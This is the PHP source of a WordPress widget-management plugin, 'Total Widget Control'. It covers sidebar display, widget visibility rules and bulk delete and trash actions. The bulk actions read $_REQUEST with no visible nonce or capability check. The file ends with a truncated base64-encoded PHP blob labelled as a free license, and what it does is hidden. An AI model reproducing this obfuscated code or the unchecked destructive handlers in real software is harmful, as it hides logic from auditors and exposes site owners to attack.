<?php 
/**
 * @Author	Jonathon byrdf
 * @link http://www.jonathonbyrd.com
 * @Package Wordpress
 * @SubPackage Total Widget Control
 * @copyright Proprietary Software, Copyright Byrd Incorporated. All Rights Reserved
 * @Since 1.0
 * 
 * @TODO I need to loop the widgets after init and create my own global arrays of certain widgets.
 * @TODO After looping the init global widget arrays, they need to be filtered
 */

defined('ABSPATH') or die("Cannot access pages directly.");

/**
 * Function is responsible for preparing the free license.
 *
 * @return null
 */
function twc_activation( )
{
	update_option('twc_is_free',true);
	wp_redirect(get_option('url').'/wp-admin/widgets.php?list_style=twc');
	return exit();
}

/**
 * function adds the plugin actions
 *
 * @param array $orig_links
 * @return array $links
 */
function twc_add_action_links( $orig_links )
{
	//initializing variables
	$links = array();
	$links['deactivate'] = $orig_links['deactivate'];
	
	$links['load'] = '<a href="'.get_bloginfo('url').'/wp-admin/widgets.php?list_style=twc" title="'.__('Open the Total Widget Control System','twc').'" class="edit">'.__('Manage Widgets').'</a>';
	return $links;
}

/**
 * This function will add help and screen option text to the widget pages
 *
 */
function twc_add_help_text()
{ 
	//initializing variables
	global $wp_registered_sidebars;
	$current_screen = twc_get_current_screen();
	
	switch ($current_screen->action)
	{
		default: 
			add_filter('screen_settings', 'twc_view_screen_options'); 
			add_filter('contextual_help', 'twc_view_help_home'); 
			break;
		case 'edit': 
			add_filter('contextual_help', 'twc_view_help_edit'); 
			break;
		case 'add':
			add_filter('contextual_help', 'twc_view_help_add'); 
			break;
	}
}

/**
 * function adds the media resources to the twc views
 *
 * @TODO Need to register and call the CSS file here
 */
function twc_add_javascript()
{
	//initializing variables
	$current_screen = twc_get_current_screen();
	
	//reasns to fail
	if ($current_screen->parent_base != 'widgets') return;
	
	switch($current_screen->action)
	{
		default:
			wp_enqueue_script( 'twc-qtip' );
			wp_enqueue_script( 'twc-base' );
			break;
		case 'edit':
		case 'add':
			// jQuery
			wp_enqueue_script( 'jquery' );
			wp_enqueue_script( 'jquery-ui-draggable' );
			wp_enqueue_script( 'jquery-ui-droppable' );
			wp_enqueue_script( 'jquery-ui-sortable' );
			
			// Nav Menu functions
			wp_enqueue_script( 'twc-base' );
			wp_enqueue_script( 'twc-nav-menu' );
			wp_enqueue_script( 'twc-qtip' );
			
			// Metaboxes 
			wp_enqueue_script( 'common' );
			wp_enqueue_script( 'wp-lists' );
			wp_enqueue_script( 'postbox' );

			//css
			wp_admin_css( 'nav-menu' );
			break;
	}
}

/**
 * Handles and bulk actions
 *
 * @return unknown
 */
function twc_bulk_actions()
{
	//reasons to fail
	if (!isset($_REQUEST['twcp_bulk_action'])) return false;
	if (!isset($_REQUEST['twcp_bulk']) || empty($_REQUEST['twcp_bulk'])) return false;
	
	//get the action
	foreach ((array)$_REQUEST['twcp_bulk_action'] as $action)
	{
		if ($action) break;
	}
	
	//reasons to fail
	if (!$action) return false;
	
	switch ($action)
	{
		case 'delete':
			twc_bulk_delete($_REQUEST['twcp_bulk']);
			break;
		case 'trash':
			twc_bulk_trash($_REQUEST['twcp_bulk']);
			break;
		default:break;
	}
}

/**
 * function is responsible for permentantely deleting given widgets.
 *
 * @param unknown_type $widgets
 */
function twc_bulk_delete( $widgets )
{
	foreach ((array)$widgets as $widget_id)
	{
		twc_delete_widget_instance( $widget_id, $delete_permanently = true );
	}
}

/**
 * function is responsible for trashing widget instances
 *
 * @param unknown_type $widgets
 */
function twc_bulk_trash( $widgets )
{
	foreach ((array)$widgets as $widget_id)
	{
		twc_delete_widget_instance( $widget_id, $delete_permanently = false );
	}
}

/**
 * Cleans up the sidebar and widget variables
 * 
 * @TODO Make sure that this function cleans up empty sidebar IDs
 *
 * @param object $wp
 */
function twc_clear( $wp = null )
{
	//intiailizing variables
	global $wp_registered_widgets, $wp_registered_sidebars;
	$sidebars_widgets = twc_wp_get_sidebars_widgets();
	$lost_widgets = array();
	
	foreach ($wp_registered_widgets as $widget_id => $widget_class)
	{
		if (!$widget_id) continue;
		$sidebar_id = twc_get_widgets_sidebar($widget_id);
		
		if ($sidebar_id == 'wp_inactive_widgets')
		{
			if (substr($widget_id,-2) == '-1') continue;
			if ((int)trim(substr($widget_id,-2)) == -1) continue;
			$lost_widgets[] = $widget_id;
		}
	}
	
	foreach ($wp_registered_sidebars as $sidebar_slug => $sidebar): 
		if (is_array($sidebars_widgets[$sidebar_slug]))
		foreach ($sidebars_widgets[$sidebar_slug] as $position => $widget_slug): 
			
			$widget = twc_get_widget_by_id( $widget_slug );	
			if (!$widget)
			{
				unset($sidebars_widgets[$sidebar_slug]);
			}
			
		endforeach;
	endforeach;
	
	$sidebars_widgets['wp_inactive_widgets'] = $lost_widgets;
	wp_set_sidebars_widgets($sidebars_widgets);
}

/**
 * Total Widget Controller
 * 
 * This function is responsible for determining which administrative page that we're
 * supposed to be looking at. We use the standard action call system that wp-admin
 * is used to using.
 *
 */
function twc_controller()
{
	//initializing variables
	global $wp_registered_sidebars;
	$current_screen = twc_get_current_screen();
	$view = 'twc-table';
	
	switch ($current_screen->action)
	{
		default:
			if (count($wp_registered_sidebars) == 1)
				$view = 'twc-no-sidebars';
			break;
		case 'manual':
			$view = 'twc-manual-license';
			break;
		case 'edit':
			$view = 'twc-edit';
			break;
		case 'delete': 
			twc_get_show_view('twc-trash-instance');
			$view = 'twc-table';
			break;
		case 'save':
			twc_get_show_view('twc-save-edit');
			$view = 'twc-add';
			break;
		case 'add':
			if (isset($_REQUEST['editwidget']) && !empty($_REQUEST['editwidget']))
			{
				twc_create_new_widget();
				$view = 'twc-edit';
			}
			else 
			{
				$view = 'twc-add';
			}
			break;
	}
	
	return do_action($view);
}

/**
 * returns the number of active widgets
 * 
 * @return integer $count
 */
function twc_count_active_widgets()
{
	//initializing variables
	global $wp_registered_widgets;
	static $count;
	
	if (!isset($count))
	{
		$count = 0;
		foreach ($wp_registered_widgets as $widget_id => $class)
		{
			if (substr($widget_id,-2) == '-1') continue;
			if ((int)trim(substr($widget_id,-2)) == -1) continue;
			$count++;
		}
		$count = $count - twc_count_inactive_widgets();
	}
	return $count;
}

/**
 * returns the number of inactive widgets
 * 
 * @return integer
 */
function twc_count_inactive_widgets()
{
	//initializing variables
	static $count;
	if (!isset($count))
	{
		$sidebars_widgets = twc_wp_get_sidebars_widgets();
		$count = count($sidebars_widgets['wp_inactive_widgets']);
	}
	return $count;
}

/**
 * Function is responsible for counting the number of widget
 * instances that will appear in a specific sidebar, on the current page.
 * 
 * @param string $sidebar_id
 * @return integer $object_id
 */
function twc_count_sidebar_widgets( $sidebar_id )
{
	//initializng variables
	static $counts;
	
	if (!isset($counts)) $counts = array();
	if (!isset($counts[$sidebar_id]))
	{
		//initializng variables
		global $sidebars_widgets;
		$counts[$sidebar_id] = array();
		$sidebars_widgets = twc_wp_get_sidebars_widgets();
		
		if (isset($sidebars_widgets[$sidebar_id]))
		{
			$counts[$sidebar_id] = count($sidebars_widgets[$sidebar_id]);
		}
		else
		{
			$counts[$sidebar_id] = 0;
		}
	}
	
	return $counts[$sidebar_id];
}

/**
 * Function is responsible for loading a brand new widget, 
 * given an id_base
 * 
 * Upon the thought of adding a new widget, the system will register a new widget
 * instance with wordpress and then load from the wp_registered_widgets array
 * 
 * @return null
 */
function twc_create_new_widget()
{
	//reasons to fail
	if ( !isset($_GET['addnew']) ) return false;
	
	//initializing variables
	global $wp_registered_widgets, $wp_registered_widget_controls, $widget;
	$widget_id = $editwidget = $_GET['editwidget'];
	
	if ( isset($_GET['base']) && isset($_GET['num']) ) { // multi-widget
		// Copy minimal info from an existing instance of this widget to a new instance
		foreach ( $wp_registered_widget_controls as $control ) {
			if ( $_GET['base'] === $control['id_base'] ) {
				$control_callback = $control['callback'];
				$multi_number = (int) $_GET['num'];
				$control['params'][0]['number'] = $multi_number;
				$widget_id = $control['id'] = $control['id_base'] . '-' . $multi_number;
				$wp_registered_widget_controls[$control['id']] = $control;
				break;
			}
		}
	}
	$wp_registered_widgets[$widget_id] = $wp_registered_widgets[$editwidget];
	$widget = $wp_registered_widgets[$widget_id] = twc_get_widget_by_id($widget_id);
	twc_save_widget_fields( $widget_id, array() );
}

/**
 * This function displays the widgets that are dynamic sidebar widgets
 * 
 * @TODO Test to see if this can be called directly
 *
 * @param unknown_type $sidebar_id
 */
function twc_default_sidebar( $index )
{
	//initializing variables
	global $wp_registered_sidebars, $wp_registered_widgets, $twc_default_sidebar_widgets, $twc_has_displayed, $twc_isDefault;
	
	if ( is_int($index) ) {
		$index = "sidebar-$index";
	} else {
		$index = sanitize_title($index);
		foreach ( (array) $wp_registered_sidebars as $key => $value ) {
			if ( sanitize_title($value['name']) == $index ) {
				$index = $key;
				break;
			}
		}
	}
	
	// fail if we have widgets on this page 
	// or if there are no defaults for this sidebar
	if ($twc_has_displayed) return false;
	if (!isset($twc_default_sidebar_widgets[$index])) return false;
	$twc_isDefault = true;
	
	foreach ((array)$twc_default_sidebar_widgets[$index] as $id => $widget)
	{
		if ( !isset($wp_registered_widgets[$id]) ) continue;
		
		$sidebar = twc_get_widgets_sidebar($index);
		$params = array_merge(
			array( array_merge( (array)$sidebar, array('widget_id' => $id, 'widget_name' => $wp_registered_widgets[$id]['name']) ) ),
			(array) $wp_registered_widgets[$id]['params']
		);

		// Substitute HTML id and class attributes into before_widget
		$classname_ = '';
		foreach ( (array) $wp_registered_widgets[$id]['classname'] as $cn ) {
			if ( is_string($cn) )
				$classname_ .= '_' . $cn;
			elseif ( is_object($cn) )
				$classname_ .= '_' . get_class($cn);
		}
		$classname_ = ltrim($classname_, '_');
		$params[0]['before_widget'] = sprintf($params[0]['before_widget'], $id, $classname_);
		
		$callback = $wp_registered_widgets[$id]['callback'];
		
		if ( is_callable($callback) ) {
			call_user_func_array($callback, $params);
			$did_one = true;
		}
	}
	$twc_isDefault = false;
	
}

/**
 * This function will delete an instance completely
 *
 * @param unknown_type $widget_id
 */
function twc_delete_widget_instance( $widget_id, $delete_permanently = false )
{
	//initializing variables
	global $wp_registered_widget_updates, $wp_registered_widgets;
	$sidebar_id = twc_get_widgets_sidebar($widget_id);
	$sidebars_widgets = twc_wp_get_sidebars_widgets();
	
	$sidebar = isset($sidebars_widgets[$sidebar_id]) ? $sidebars_widgets[$sidebar_id] : array();
	$sidebar = array_diff( $sidebar, array($widget_id) );
	$sidebars_widgets[$sidebar_id] = $sidebar;
	
	if (!$delete_permanently)
	{
		$sidebars_widgets['wp_inactive_widgets'] = array_merge((array)$widget_id, (array) $sidebars_widgets['wp_inactive_widgets']);
	}
	else
	{
		//initializing variables
		$widget = twc_get_widget_by_id($widget_id);
		
		if ($widget)
		{
			$_POST = array();
			$_POST['multi_number'] = $widget['number'];
			$_POST['the-widget-id'] = $widget['id'];
			$_POST['delete_widget'] = '1';
			$wp_registered_widgets[$widget_id]['params'][0]['number'] = $widget['number'];
			
			//this calls the widgets update function with the given params
			foreach ( (array) $wp_registered_widget_updates as $name => $control )
			{
				if ( $name != $widget['id_base'] || !is_callable($control['callback']) )
					continue;
				
				ob_start();
					call_user_func_array( $control['callback'], $control['params'] );
				ob_get_clean();
				unset($wp_registered_widgets[$widget_id]);
				break;
			}
		}
	}
	
	wp_set_sidebars_widgets($sidebars_widgets);
}

/**
 * Function calls the save widget_sidebar function with the proper
 * parameters to delete the relationship.
 *
 * @param unknown_type $widget_id
 * @param unknown_type $sidebar_id
 * @return unknown
 */
function twc_delete_widget_sidebar( $widget_id, $sidebar_id )
{
	return twc_save_widget_sidebar($widget_id, $sidebar_id, 0, true);
}

/**
 * function is responsible for hijacking the dynamic_sidebar function. 
 * This function will always return false to the dynamic sidebar
 *
 */
function twc_display_the_sidebar( $params )
{
	//initializing variables
	global $wp_registered_widgets, $twc_wp_registered_widgets, $twc_default_sidebar_widgets;
	
	if (!isset($twc_wp_registered_widgets))
	{
		$twc_wp_registered_widgets = $wp_registered_widgets;
	}
	
	//clean the registered_widgets global
	foreach ((array)$wp_registered_widgets as $widget_id => $widget)
	{
		if (is_a($wp_registered_widgets[$widget_id]['callback'][0], 'twcEmptyWidgetClass')) 
			break;
		
		// since we're running a loop already, then let's take this opportunity
		// to create the defaults widgets array\
		// @TODO This data needs to be sorted out just after the init function
		$_widget = twc_get_widget_by_id($widget_id);
		if ($_widget['p']['twcp_default_sidebar'] == 'default')
		{
			$default_sidebar_id = twc_get_widgets_sidebar($widget_id);
			$twc_default_sidebar_widgets[$default_sidebar_id][$widget_id] = $widget;
		}
		
		//empty the registered_widgets array
		$wp_registered_widgets[$widget_id]['callback'] = array();
		$wp_registered_widgets[$widget_id]['callback'][0] = new twcEmptyWidgetClass();
		$wp_registered_widgets[$widget_id]['callback'][1] = 'twc_empty_callback';
	}
	
	return $params;
}

/**
 * function receives all of the widget data prior to display, and allows us
 * to return a false to hide the widget.
 * 
 * returning false will hide the widget
 * 
 * @TODO I need a function that will display the widget_display with only the widget_id param
 *
 * @param array $instance
 * @param object $widget
 * @param array $args
 * @param boolean $force
 * @return unknown
 */
function twc_display_the_widget( $instance = null, $widget_id, $args = null, $force = false )
{
	//initializing variables
	global $wp_query, $wp_registered_sidebars, $twc_has_displayed;
	
	if (is_object($widget_id))
	{
		$widget_id = $widget_id->id;
	}
	$widget = twc_get_widget_by_id($widget_id);
	$display = twc_is_widget_displaying($widget);
	
	if (is_null($instance))
	{
		$instance = $widget['p'];
	}
	
	//reasons to fail
	$display = apply_filters('twc_display_widget', $display, $widget);
	if (!$display && !$force) return false;
	
	//initializing variables
	$args = $wp_registered_sidebars[$widget['sidebar_id']];
	
	//load the widget into a variable
	ob_start();
	$widget['callback'][0]->widget($args, $instance);
	$display = ob_get_clean();
	
	//displaying the widget
	$twc_has_displayed = true;
	echo apply_filters('twc_widget_display', $display, $widget);
	return apply_filters('twc_wordpress_default_sidebar', false, $instance);
}

/**
 * function returns true if the widget is to be displayed
 *
 * @param boolean $current
 * @param array $widget
 * @return unknown
 */
function twc_display_if_excluded( $current, $widget )
{
	//initializing variables
	global $twc_isDefault;
	
	//check to see if we're even going to load this widget
	$isExclude = (isset($widget['p']['twcp_exclude_sidebar']) && $widget['p']['twcp_exclude_sidebar'] == 'exclude');
	
	if (!$twc_isDefault && ((!$current && !$isExclude) || ($current && $isExclude))) 
		return false;
	
	return true;
}

/**
 * function is responsible for returning true if the widget is a default
 *
 * @param unknown_type $display
 * @param unknown_type $widget
 * @return unknown
 */
function twc_display_if_default( $display, $widget )
{
	//initializing variables
	global $twc_isDefault;
	$isDefault = (isset($widget['p']['twcp_default_sidebar']) && $widget['p']['twcp_default_sidebar'] == 'default');
	
	//reasons to return
	if ($twc_isDefault && $isDefault) return true;
	
	return $display;
}

/**
 * function is responsible for displaying the status
 *
 * @param boolean $display
 * @param object $widget
 * @return boolean
 */
function twc_display_if_status( $display, $widget )
{
	//initializing variables
	global $twc_widgetlistings_type;
	
	//reasons to fail
	if ($twc_widgetlistings_type == 'admin') return $display;
	if (!$display) return false;
	if ($widget['p']['twcp_status'] != 'enabled') return false;
	
	return true;
}

/**
 * function is responsible for displaying the status
 *
 * @param boolean $display
 * @param object $widget
 * @return boolean
 */
function twc_display_if_timestamp( $display, $widget )
{
	//initializing variables
	global $twc_widgetlistings_type;
	$widget_time = $widget['p']['twcp_publish_time'];
	
	//reasons to fail
	if ($twc_widgetlistings_type == 'admin') return $display;
	if (!$display) return false;
	if ($widget_time > time()) return false;
	
	return true;
}

/**
 * function is responsible for displaying proper visibility
 *
 * @param boolean $display
 * @param object $widget
 * @return boolean
 */
function twc_display_if_visiblity( $display, $widget )
{
	//initializing variables
	global $twc_widgetlistings_type;
	
	//reasons to fail
	if ($twc_widgetlistings_type == 'admin') return $display;
	if (!$display) return $display;
	if (!isset($widget['p']['twcp_visibility'])) return $display;
	
	//initializing variables
	global $current_user, $wp_roles;
	get_currentuserinfo();
	$user_roles = $current_user->roles;
	$user_role = array_shift($user_roles);
	if (is_null($user_role)) $user_role = 'public';
	$isParent = false;
	$visibleParent = ($widget['p']['twcp_visible_parent'] == 'parent');
	
	foreach ((array)$wp_roles->roles as $role => $name)
	{
		if ($role == $widget['p']['twcp_visibility'])
		{
			break;
		}
		if ($role == $user_role)
		{
			$isParent = true;
			break;
		}
	}
	
	//setting matches
	$matchedRole = ($user_role == $widget['p']['twcp_visibility']);
	
	if ($matchedRole) return true;
	if (!$visibleParent && $isParent) return true;
	
	return false;
}

/**
 * The hijack is completed and this function is called with the correct sidebar_id
 * Now we can run our own sidebar.
 * 
 * @param int|string $index Optional, default is 1. Name or ID of dynamic sidebar.
 * @return bool True, if widget sidebar was found and called. False if not found or not called.
 */
function twc_dynamic_sidebar( $index = 1 )
{
	//initializing variables
	global $wp_registered_sidebars, $wp_registered_widgets, $twc_isDefault, $twc_has_displayed;
	$twc_isDefault = false;
	$twc_has_displayed = FALSE;
	
	if ( is_int($index) ) {
		$index = "sidebar-$index";
	} else {
		$index = sanitize_title($index);
		foreach ( (array) $wp_registered_sidebars as $key => $value ) {
			if ( sanitize_title($value['name']) == $index ) {
				$index = $key;
				break;
			}
		}
	}

	//initializing variables
	$count = twc_count_sidebar_widgets($index);
	$sidebars_widgets = wp_get_sidebars_widgets();
	
	//reasons to return
	if ($count == 0) return false;
	if ( empty($wp_registered_sidebars[$index]) || !array_key_exists($index, $sidebars_widgets) || !is_array($sidebars_widgets[$index]) || empty($sidebars_widgets[$index]) )
		return false;

	$sidebar = $wp_registered_sidebars[$index];
	
	$did_one = false;
	foreach ( (array) $sidebars_widgets[$index] as $id )
	{
		if ( !isset($wp_registered_widgets[$id]) ) continue;
		
		//$sidebar = twc_get_widgets_sidebar($index);
		$params = array_merge(
			array( array_merge( (array)$sidebar, array('widget_id' => $id, 'widget_name' => $wp_registered_widgets[$id]['name']) ) ),
			(array) $wp_registered_widgets[$id]['params']
		);
		
		// Substitute HTML id and class attributes into before_widget
		$classname_ = '';
		foreach ( (array) $wp_registered_widgets[$id]['classname'] as $cn ) {
			if ( is_string($cn) )
				$classname_ .= '_' . $cn;
			elseif ( is_object($cn) )
				$classname_ .= '_' . get_class($cn);
		}
		$classname_ = ltrim($classname_, '_');
		$params[0]['before_widget'] = sprintf($params[0]['before_widget'], $id, $classname_);
		
		$callback = $wp_registered_widgets[$id]['callback'];
		
		if ( is_callable($callback) ) {
			call_user_func_array($callback, $params);
			$did_one = true;
		}
	}

	return $did_one;
}

/**
 * Class is responsible for nothing.
 * This class is merely a filler class to receive the proper functionality
 * from the dynamic_sidebar function.
 *	
 */
class twcEmptyWidgetClass
{
	function twc_empty_callback( $sidebar_args )
	{
		//do nothing
	}
}

/**
 * Checks for the search type
 *
 * @return unknown
 */
function twc_filter_list_for()
{
	if (!isset($_REQUEST['twcp_filter']) || empty($_REQUEST['twcp_filter'])) return false;
	$_REQUEST['inactive'] = 'active';
	
	return $_REQUEST['twcp_filter'];
}

/**
 * Get the current page
 * 
 * Function is responsible for loading the current screen object which defines the
 * current page as the admin widget page.
 * 
 * @return unknown
 */
function twc_get_current_screen()
{
	//initializing variables
	static $current_screen;
	
	if (isset($current_screen)) return $current_screen;
	
	//initializing variables
	$parts = pathinfo($_SERVER['PHP_SELF']);
	$parent_file = apply_filters("twc_parent_file", $parts['basename']); // 'themes.php' For plugins to move submenu tabs around.
	
	$current_screen = new stdClass();
	$current_screen->parent_file = $parent_file;
	$current_screen->parent_base = preg_replace('/\?.*$/', '', $parent_file);
	$current_screen->parent_base = str_replace('.php', '', $current_screen->parent_base);
	$current_screen->id = 'twc-widgets';
	$current_screen->base = 'widgets';
	
	if ($GLOBALS['TWCAUTH']&&!isset($_REQUEST['action']))
	{
		$current_screen->action = 'auth';
	}
	else
	{
		$current_screen->action = strtolower($_REQUEST['action']);
	}
	
	return $current_screen;
}

/**
 * Function is responsible for loading the widget, validating its variables
 * and loading the widgets parameters.
 *
 * @param string $widget_id
 * @return static reference array $widget
 */
function &twc_get_widget_by_id( $widget_id )
{
	//initializing variables
	global $wp_registered_widgets;
	static $twc_registered_widgets;
	$widget = @$wp_registered_widgets[$widget_id];
	
	if (!isset($twc_registered_widgets))
	{
		$twc_registered_widgets = array();
	}
	
	//reasons to fail
	if (isset($twc_registered_widgets[$widget_id])) return $twc_registered_widgets[$widget_id];
	if (!$widget) return false;
	
	//initializing widget variables
	$widget['id'] = $widget_id;
	$widget['id_base'] = _get_widget_id_base($widget_id);
	$widget['number'] = absint(str_replace($widget['id_base'], '', $widget_id));
	$widget['multiwidget'] = (isset($widget['number']) && $widget['number']);
	$widget['sidebar_id'] = twc_get_widgets_sidebar( $widget_id );
	$widget['position'] = twc_get_widgets_sidebar( $widget_id, 'position' );
	$widget['p'] = array();
	
	//validating the widget identification
	@$widget['params'][0]['number'] = $widget['number'];
	if (is_object( $widget['callback'][0] ))
	{
		$widget['callback'][0]->number = $widget['number'];
		$widget['callback'][0]->id = $widget['id'];
	}
	
	//loading settings
	if (is_callable( array($widget['callback'][0], 'get_settings') ))
	{
		$params = $widget['callback'][0]->get_settings();
		$widget['p'] = $params[$widget['number']];
	}
	
	$twc_registered_widgets[$widget_id] = $widget;
	return $widget;
}

/**
 * Function is responsible for branding wordpress a little :)
 *
 * @param unknown_type $text
 * @return unknown
 */
function twc_gettext( $text )
{
	//initializing variables
	$current_screen = twc_get_current_screen(); 
	$base = $current_screen->parent_base;
	
	$lan = array(
		'themes' => array(
			'Screen Options' => _('5Twenty Studios')
		),
	);
	
	if (isset($lan[$base]) && isset($lan[$base][$text]))
	{
		$text = $lan[$base][$text];
	}
	
	return $text;
}

/**
 * function returns the position and the sidebar for a given widget
 * 
 * @TODO Need to create a separate function that will be called to return the position value
 * @TODO This function should only return a sidebar as a value, if the type is sidebar
 * 
 * @param unknown_type $widget_id
 * @param unknown_type $type
 * @return unknown
 */
function twc_get_widgets_sidebar( $widget_id, $type = 'sidebar' )
{
	//initializing variables
	$sidebars_widgets = twc_wp_get_sidebars_widgets();
	static $flipped;
	
	if (!isset($flipped))
	{
		unset($sidebars_widgets['wp_inactive_widgets']);
		foreach ((array)$sidebars_widgets as $_sidebar => $widgets)
		{
			foreach ((array)$widgets as $position => $widgetid)
			{
				$flipped[$widgetid] = array(
						'sidebar' => $_sidebar,
						'position' => (int)trim($position),
					);
			}
		}
	}
	
	//return sidebar info
	if ($type == 'position')
	{
		if (!isset($flipped[$widget_id][$type]))
		{
			return 0;
		}
		else
		{
			return $flipped[$widget_id][$type];
		}
	}
	else // if sidebar
	{
		if (!isset($flipped[$widget_id][$type]))
		{
			return 'wp_inactive_widgets';
		}
		else
		{
			return $flipped[$widget_id][$type];
		}
	}
}

/**
 * this function adds the 'add new' button to the list page
 *
 */
function twc_h2_add_new()
{
	//initializing variables
	$current_screen = twc_get_current_screen();
	if ($current_screen->action != '') return;
	
	echo '<a href="'.get_bloginfo('url').'/wp-admin/widgets.php?action=add" class="button add-new-h2">'.__('Add New','twc').'</a>';
}

/**
 * This does our checking to see if the current view is for active of 
 * inactive widgets
 *
 * @return boolean
 */
function twc_inactive_list()
{
	return (isset($_REQUEST['inactive']) && $_REQUEST['inactive'] == 'inactive');
}

/**
 * This initializes the twc system with the proper hooks.
 *
 * @return null
 */
function twc_initialize()
{
	//initializing variables
	global $twc_table_type, $twc_widgetlistings_type, $twc_has_displayed;
	$twc_table_type = $twc_widgetlistings_type = 'default';
	$twc_has_displayed = false;
	
	wp_register_script( 'twc-nav-menu', plugin_dir_url(__file__).'js/twc-nav-menu.js');
	wp_register_script( 'twc-base', plugin_dir_url(__file__).'js/twc.js');
	wp_register_script( 'twc-qtip', plugin_dir_url(__file__).'js/tooltips.js');
	wp_register_script( 'twc-sortables', plugin_dir_url(__file__).'js/sortables.js');
	
	wp_register_style( 'twc', plugin_dir_url(__file__).'css/twc.css');
	wp_register_style( 'twc-sortables', plugin_dir_url(__file__).'css/twcSortables.css');
	
	add_shortcode( 'twc_show_widget', 'twc_shortcode_widget' );
	add_shortcode( 'twc_show_sidebar', 'twc_shortcode_sidebar' );
	
	add_action('sidebar_admin_setup', 'twc_init', 100);
	add_action('admin_notices', 'twc_view_switch', 1);
	add_action('admin_init', 'twc_set_object_id');
	add_action('init', 'twc_add_javascript');
	add_action('init', 'show_ajax', 100);
	add_action('init', 'twc_registration', 1);
	add_action('init', 'twc_receive_license', 1);
	add_action('twc_init', 'twc_admin_notices');
	add_action('twc_init', 'twc_view_widget_wrap', 20);
	add_action('twc_init', 'twc_destruct', 100);
	add_action('twc_display_admin', 'twc_view_auth');
	add_action('twc_display_admin', 'twc_register');
	add_action('twc_display_admin', 'twc_manual_license');
	add_action('twc-register', 'twc_register');
	add_action('twc-table', 'twc_rows', 10);
	add_action('widgets_init', 'init_registered_widgets', 1);
	add_action('twc-free-registration', 'twc_activation' );
	add_action('admin_menu', 'f20_add_metaboxes');
	add_action('save_post', 'f20_metabox_save_data');
	add_action('wp_footer','twc_show_object_id');
	add_action('wp', 'twc_sortable_initialize');
	add_action('wp','twc_set_object_url');
	
	add_filter('gettext', 'twc_gettext');
	add_filter('plugin_action_links_total-widget-control/index.php', 'twc_add_action_links');
	add_filter('plugin_row_meta', 'twc_plugin_row_meta', 10, 2);
	add_filter('twc_widget_display', 'twc_sortable_wrapper', 1000, 2);
	
	function twc_manual_license(){twc_show_view('twc-manual-license');}
	function twc_register(){ twc_show_view('twc-register'); }
	function twc_init(){ if (!twc_list_style_twc()) return; do_action('twc_init'); }
	function twc_destruct(){ _520(); exit(); }
	function twc_admin_notices(){ add_action('admin_notices', 'read_520_rss'); }
	function twc_view_screen_options(){ return twc_get_show_view('twc-screen-options'); }
	function twc_view_help_home(){ return twc_get_show_view('twc-help-home'); }
	function twc_view_help_edit(){ return twc_get_show_view('twc-help-edit'); }
	function twc_view_help_add(){ return twc_get_show_view('twc-help-add'); }
	function twc_view_widget_wrap(){ twc_show_view('twc-widget-wrap'); }
	function twc_view_auth(){ twc_show_view('twc-auth'); }
	if (!array_key_exists('TWCAUTH', $GLOBALS)) $GLOBALS['TWCAUTH'] = true;
	
	f20_register_metabox(array(
	    'id' => 'my-meta-box',
	    'title' => 'Total Widget Control',
	    'page' => true,
	    'context' => 'normal',
	    'priority' => 'high',
	    'fields' => array(
	        array(
	            'name' => '',
	            'desc' => '',
	            'id' => 'twc-meta-listings',
	            'type' => 'show_view',
	            'std' => ''
	        ),
	    )
	));
	
	if (!function_exists('twc_view_pro_edit') && !function_exists('twc_widget_protitle') && get_option('twc_is_free',false))
	{
		$freelicense = 'IGNsYXNzIFpqSXdYMlp2ZFhKMGVRIHsgcHJvdGVjdGVkICRTMlY1Y3cgPSBhcnJheSgncHJpdmF0ZSc9PicnLCd4ZmFjdG9yJz0+JycsJ3lmYWN0b3InPT4nJyk7IHByb3RlY3RlZCAkVEc5amEzTSA9IGFycmF5KCk7IHByb3RlY3RlZCBmdW5jdGlvbiAmUjJWMFMyVjUoJGJHOWphMVI1Y0dVKXsgcmV0dXJuICR0aGlzLT5TMlY1Y3dbJGJHOWphMVI1Y0dVXTsgfSBwcm90ZWN0ZWQgZnVuY3Rpb24gU1c1elpYSjBTMlY1Y3coKXsgJHRoaXMtPlVtVnRiM1psUzJWNSgpOyAkdGhpcy0+VW1WelpYUk1iMk5yKCk7IGZvcmVhY2ggKCR0aGlzLT5TMlY1Y3cgYXMgJFMyVjVWSGx3WlEgPT4gJFMyVjUpeyBpZiAoc3Ryc3RyKCRTMlY1Vkhsd1pRLCAnZmFjdG9yJykpeyAkUzJWNSA9IG1kNShzZXJpYWxpemUoJHRoaXMtPlMyVjVjdykpOyB9IGVsc2UgeyAkUzJWNSA9ICdsb2NhbGhvc3QnOyB9ICR0aGlzLT5TVzV6WlhKMFMyVjUoJFMyVjUsICRTMlY1Vkhsd1pRKTsgfSB9IHByb3RlY3RlZCBmdW5jdGlvbiBTVzV6WlhKMFMyVjUoJGEyVjUsICRiRzlqYTFSNWNHVSl7IGlmIChzdHJsZW4oJGEyVjUpID4gMCl7ICR0aGlzLT5TMlY1Y3dbJGJHOWphMVI1Y0dVXSA9ICRhMlY1OyB9IH0gcHJvdGVjdGVkIGZ1bmN0aW9uIFZIVnlia3RsZVEoJGJHOWphMVI1Y0dVID0gJycpeyBpZiAoISRiRzlqYTFSNWNHVSl7IGZvcmVhY2ggKCR0aGlzLT5URzlqYTNNIGFzICRURzlqYTFSNWNHVSA9PiAkVEc5amF3KXsgJHRoaXMtPlZIVnlia3RsZVEoJFRHOWphMVI1Y0dVKTsgfSByZXR1cm47IH0gJFMyVjUgPSYgJHRoaXMtPlIyVjBTMlY1KCRiRzlqYTFSNWNHVSk7IGZvciAoJGFRID0gMDsgJGFRIDwgc3RybGVuKCRTMlY1KTsgJGFRKyspeyAkVTNSbGNITSA9IG9yZCgkUzJWNVskYVFdKSAvICgkYVEgKyAxKTsgaWYgKG9yZCgkUzJWNVskYVFdKSAlIDIgIT0gMCl7ICR0aGlzLT5WSFZ5Ymt4dlkycygkYkc5amExUjVjR1UsICRVM1JsY0hNLCAnbGVmdCcpOyB9IGVsc2UgeyAkdGhpcy0+VkhWeWJreHZZMnMoJGJHOWphMVI1Y0dVLCAkVTNSbGNITSwgJ3JpZ2h0Jyk7IH0gfSB9IHByb3RlY3RlZCBmdW5jdGlvbiBVbVZ0YjNabFMyVjUoJGJHOWphMVI1Y0dVID0gJycpeyBmb3JlYWNoKCR0aGlzLT5TMlY1Y3cgYXMgJFMyVjVUbUZ0WlEgPT4gJFMyVjUpeyBpZiAoJGJHOWphMVI1Y0dVID09ICRTMlY1VG1GdFpRIHx8IHN0cmxlbigkYkc5amExUjVjR1UpID09IDApeyAkdGhpcy0+UzJWNWN3WyRTMlY1VG1GdFpRXSA9ICcnOyB9IH0gfSBwcm90ZWN0ZWQgZnVuY3Rpb24gJlIyVjBURzlqYXcoJ